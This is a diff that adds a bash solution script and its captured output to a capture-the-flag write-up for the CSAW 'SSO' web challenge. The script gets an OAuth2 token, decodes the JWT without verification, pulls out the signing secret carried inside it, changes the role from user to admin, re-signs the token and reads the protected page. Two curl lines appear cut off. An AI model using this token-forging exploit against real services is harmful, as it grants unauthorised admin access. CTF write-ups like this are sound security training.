@@ -693,6 +693,58 @@ Output :
 flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}
 ```
 
+To resume all the commands needed to get the flag, you can get all the commands from below or from this [sso_solution.sh](resources/web-100-sso/sso_solution.sh)
+
+```sh
+#!/bin/bash
+
+cl_id=1
+echo "POST http://web.chal.csaw.io:9000/oauth2/authorize"
+auth_key=$(curl --silent 2>&1 -X POST  http://web.chal.csaw.io:9000/oauth2/authorize --data "response_type=code&client_id=${cl_id}&redirect_uri=http://web.chal.csaw.io$
+echo "Getting Authorization Code : ${auth_key}"
+echo "POST http://web.chal.csaw.io:9000/oauth2/token (using this Authorization Code"
+token=$(curl --silent 2>&1 -X POST  http://web.chal.csaw.io:9000/oauth2/token --data "grant_type=authorization_code&code=${auth_key}&client_id=${cl_id}&redirect_uri=ht$
+echo "Getting Json Response : ${token}"
+jwt=$(echo $token | python -c "import sys, json;data = json.load(sys.stdin);print data['token'];")
+echo "Installing PyJWT python2.x library"
+pip install PyJWT
+echo "Extracting JWT Token : ${jwt}"
+jwt_decoded=$(pyjwt decode --no-verify $jwt)
+echo "Decoding JWT Token : ${jwt_decoded}"
+jwt_decoded_admin=$(echo $jwt_decoded | sed -e 's/user/admin/')
+echo "Replacing 'user by 'admin' : ${jwt_decoded_admin}"
+secret=$(echo $jwt_decoded_admin | python -c "import sys, json;data = json.load(sys.stdin);print data['secret'];")
+echo "Extracting JWT secret for signing while encoding this payload : ${secret}"
+jwt_new=$(python -c "import jwt;print jwt.encode(${jwt_decoded_admin}, '${secret}', algorithm='HS256')")
+echo "Generating the new JWT Token : ${jwt_new}"
+verif=$(pyjwt decode --no-verify $jwt_new)
+echo "Verifing the JWT Token content : ${verif}"
+echo "GET http://web.chal.csaw.io:9000/protected"
+echo "Response :"
+curl  http://web.chal.csaw.io:9000/protected -H "Authorization: Bearer ${jwt_new}"
+echo ""
+```
+
+Output :
+
+```
+POST http://web.chal.csaw.io:9000/oauth2/authorize
+Getting Authorization Code : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiIxIiwicmVkaXJlY3RfdXJpIjoiaHR0cDovL3dlYi5jaGFsLmNzYXcuaW86OTAwMC9vYXV0aDIvdG9rZW4iLCJpYXQiOjE1MzcyMjg3ODMsImV4cCI6MTUzNzIyOTM4M30.1w-Wrwz-jY9UWErqy_W8Xra8FUUQdfJttvQLbELY050
+POST http://web.chal.csaw.io:9000/oauth2/token (using this Authorization Code
+Getting Json Response : {"token_type":"Bearer","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzIyODc4MywiZXhwIjoxNTM3MjI5MzgzfQ.Vmt9Fr7MJ3_UxC5Dj8elPAwt6UT0p6CkjgaJa4LdAaI"}
+Installing PyJWT python2.x library
+Requirement already satisfied: PyJWT in /usr/local/lib/python2.7/dist-packages
+Extracting JWT Token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzIyODc4MywiZXhwIjoxNTM3MjI5MzgzfQ.Vmt9Fr7MJ3_UxC5Dj8elPAwt6UT0p6CkjgaJa4LdAaI
+Decoding JWT Token : {"iat": 1537228783, "secret": "ufoundme!", "type": "user", "exp": 1537229383}
+Replacing 'user by 'admin' : {"iat": 1537228783, "secret": "ufoundme!", "type": "admin", "exp": 1537229383}
+Extracting JWT secret for signing while encoding this payload : ufoundme!
+Generating the new JWT Token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1MzcyMjg3ODMsInNlY3JldCI6InVmb3VuZG1lISIsInR5cGUiOiJhZG1pbiIsImV4cCI6MTUzNzIyOTM4M30.RCW_UsBuM_0Le-kawO2CNolAFwUS3zYLoQU_2eDCurw
+Verifing the JWT Token content : {"iat": 1537228783, "secret": "ufoundme!", "type": "admin", "exp": 1537229383}
+GET http://web.chal.csaw.io:9000/protected
+Response :
+flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}
+```
+
 So, the flag is `flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}`
 
 
